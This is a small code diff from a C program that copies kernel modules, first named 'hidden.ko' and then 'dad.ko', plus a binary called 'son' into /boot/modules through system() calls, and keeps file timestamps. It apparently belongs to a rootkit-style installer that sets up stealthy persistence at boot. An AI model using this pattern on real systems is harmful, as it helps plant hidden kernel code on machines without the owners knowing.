@@ -19,7 +19,7 @@ int main(int argc, char *argv[]) {
         time[0].tv_sec = sb.st_atime;
         time[1].tv_sec = sb.st_mtime;
 
-        char string[] = "cp hidden.ko /boot/modules";
+        char string[] = "cp dad.ko /boot/modules";
         system(string);
         char string2[] = "cp son /boot/modules";
         system(string2);
